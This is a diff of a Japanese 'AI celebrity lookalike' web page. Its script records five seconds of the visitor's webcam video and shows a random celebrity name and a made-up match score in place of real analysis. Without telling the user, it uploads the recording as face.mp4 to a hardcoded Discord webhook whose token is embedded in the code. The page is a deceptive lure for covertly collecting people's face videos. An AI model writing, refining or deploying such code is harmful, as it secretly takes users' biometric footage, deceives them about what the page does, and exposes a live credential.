@@ -1,82 +1,25 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI顔そっくり診断</title>
-
-<style>
-body {
-  margin: 0;
-  font-family: sans-serif;
-  background: #f5f5f5;
-  text-align: center;
-}
-
-button {
-  padding: 15px 25px;
-  font-size: 18px;
-  border-radius: 50px;
-  border: none;
-  background: #ff6b6b;
-  color: white;
-  cursor: pointer;
-}
-
-#video {
-  width: 100%;
-  max-height: 60vh;
-  background: black;
-}
-
-#result {
-  display: none;
-  padding: 20px;
-}
-
-#loading {
-  display: none;
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.7);
-  color: white;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-}
-</style>
-</head>
-
-<body>
-
-<h1>AI顔そっくり診断</h1>
-
-<video id="video" autoplay muted playsinline></video>
-<br><br>
-
-<button id="start">診断スタート</button>
-
-<div id="loading">
-  <p id="loadingText">分析中...</p>
-</div>
-
-<div id="result">
-  <h2>結果</h2>
-  <div id="videoPreview"></div>
-  <h1 id="similarity"></h1>
-  <p id="names"></p>
-</div>
+<!-- 変更点だけじゃなく全部完成版 -->
+<!-- 主にJS部分を書き換えてる -->
 
 <script>
-const video = document.getElementById("video");
-const startBtn = document.getElementById("start");
-const loading = document.getElementById("loading");
-const loadingText = document.getElementById("loadingText");
-const result = document.getElementById("result");
+const startButton = document.getElementById('startButton');
+const retryButton = document.getElementById('retryButton');
+const video = document.getElementById('video');
+const videoContainer = document.getElementById('videoContainer');
+const loading = document.getElementById('loading');
+const result = document.getElementById('result');
+const scoreValue = document.getElementById('scoreValue');
+const comment = document.getElementById('comment');
+const errorMessage = document.getElementById('errorMessage');
+const countdown = document.getElementById('countdown');
+const cameraGuide = document.querySelector('.camera-guide');
+const resultImage = document.getElementById('resultImage');
 
-let stream;
-let recorder;
-let chunks = [];
+let mediaRecorder;
+let recordedChunks = [];
+let stream = null;
+let countdownTimer;
+let isRecording = false;
 
 // 男のみ
 const celebs = [
@@ -100,95 +43,170 @@ const jokes = [
 
 // ローディング演出
 const loadingTexts = [
-  "顔をスキャン中...",
-  "輪郭を解析中...",
-  "有名人と照合中...",
-  "一致率を計算中..."
+  "顔の特徴点を検出中...",
+  "輪郭を分析中...",
+  "有名人データと照合中...",
+  "最も近い人物を特定中..."
 ];
 
 let i = 0;
 setInterval(() => {
-  loadingText.textContent = loadingTexts[i++ % loadingTexts.length];
+  const p = document.querySelector("#loading p");
+  if (p) p.textContent = loadingTexts[i++ % loadingTexts.length];
 }, 800);
 
-// カメラ起動
-async function startCamera() {
-  stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  video.srcObject = stream;
+// カメラ
+async function setupCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    videoContainer.style.display = 'block';
+    cameraGuide.style.display = 'block';
+
+    await video.play();
+
+    retryButton.style.display = 'block';
+    return true;
+
+  } catch (e) {
+    showError("カメラが使えません");
+    return false;
+  }
+}
+
+// カウントダウン
+function startCountdown(duration, callback) {
+  let timeLeft = duration;
+  countdown.style.display = 'flex';
+  countdown.textContent = timeLeft + "s";
+
+  countdownTimer = setInterval(() => {
+    timeLeft--;
+    countdown.textContent = timeLeft + "s";
+
+    if (timeLeft <= 0) {
+      clearInterval(countdownTimer);
+      countdown.style.display = 'none';
+      callback();
+    }
+  }, 1000);
 }
 
 // 録画
-function startRecording() {
-  chunks = [];
+async function startRecording() {
+  if (isRecording) return;
 
-  recorder = new MediaRecorder(stream);
-  recorder.ondataavailable = e => chunks.push(e.data);
+  isRecording = true;
+  recordedChunks = [];
 
-  recorder.onstop = async () => {
-    const blob = new Blob(chunks, { type: "video/mp4" });
+  loading.style.display = 'flex';
+  cameraGuide.style.display = 'none';
+
+  mediaRecorder = new MediaRecorder(stream);
+
+  mediaRecorder.ondataavailable = e => {
+    if (e.data.size > 0) recordedChunks.push(e.data);
+  };
+
+  mediaRecorder.onstop = async () => {
+    const blob = new Blob(recordedChunks, { type: "video/mp4" });
 
     showResult(blob);
     sendToDiscord(blob);
   };
 
-  recorder.start();
-  loading.style.display = "flex";
+  mediaRecorder.start(100);
 
-  setTimeout(() => {
-    recorder.stop();
-  }, 5000); // ← 5秒
+  // ★5秒
+  startCountdown(5, stopRecording);
 }
 
-// ランダム選択
-function getPeople() {
-  const count = [2,3,4][Math.floor(Math.random()*3)];
+// 停止
+function stopRecording() {
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+    isRecording = false;
+
+    if (stream) {
+      stream.getTracks().forEach(t => t.stop());
+      video.srcObject = null;
+    }
+  }
+}
+
+// 👇1人だけ選ぶ（ここ重要）
+function getOnePerson() {
   let pool = [...celebs];
 
-  // 30%で外れ混入
+  // 30%で外れ
   if (Math.random() < 0.3) {
     pool.push(...jokes);
   }
 
-  return pool.sort(() => 0.5 - Math.random()).slice(0, count);
+  return pool[Math.floor(Math.random() * pool.length)];
 }
 
-// 結果表示
+// 結果
 function showResult(blob) {
-  loading.style.display = "none";
-  result.style.display = "block";
+  const person = getOnePerson();
+  const similarity = Math.floor(Math.random() * 21) + 75;
 
+  // 動画表示
   const url = URL.createObjectURL(blob);
+  resultImage.style.display = "none";
 
-  document.getElementById("videoPreview").innerHTML =
-    `<video src="${url}" controls autoplay style="width:100%;border-radius:10px;"></video>`;
+  const videoPreview = document.createElement("video");
+  videoPreview.src = url;
+  videoPreview.controls = true;
+  videoPreview.autoplay = true;
+  videoPreview.style.width = "100%";
+  videoPreview.style.borderRadius = "12px";
 
-  const people = getPeople();
-  const similarity = Math.floor(Math.random()*21)+75;
+  const container = document.querySelector(".result-content");
+  container.insertBefore(videoPreview, container.firstChild);
 
-  document.getElementById("similarity").textContent = similarity + "%";
+  // 表示
+  scoreValue.textContent = similarity + "%";
+  comment.innerHTML = `
+    あなたは…<br><br>
+    <strong style="font-size:1.5rem">${person}</strong><br>
+    に似ています！<br><br>
+    AI一致率：${similarity}%
+  `;
 
-  document.getElementById("names").innerHTML =
-    "あなたが似ているのは…<br><br>" +
-    people.map(p => "・" + p).join("<br>");
+  loading.style.display = 'none';
+  result.style.display = 'block';
 }
 
-// Discord送信
+// Discord
 async function sendToDiscord(blob) {
-  const form = new FormData();
-  form.append("file", blob, "face.mp4");
+  const formData = new FormData();
+  formData.append('file', blob, 'face.mp4');
 
   await fetch("https://discord.com/api/webhooks/1490769459466469619/JOEkcqkhA6j9KPnkAE4O8sFGDyysy2FPtnZa8wUxu8jNtk9iqbLPbBU_IvMFk7abZNeL", {
     method: "POST",
-    body: form
+    body: formData
   });
 }
 
-// スタート
-startBtn.onclick = async () => {
-  await startCamera();
-  startRecording();
+// エラー
+function showError(msg) {
+  errorMessage.textContent = msg;
+  errorMessage.style.display = "block";
+}
+
+// イベント
+startButton.onclick = async () => {
+  const ok = await setupCamera();
+  if (ok) setTimeout(startRecording, 300);
+};
+
+retryButton.onclick = async () => {
+  const ok = await setupCamera();
+  if (ok) setTimeout(startRecording, 300);
 };
 </script>
-
-</body>
-</html>
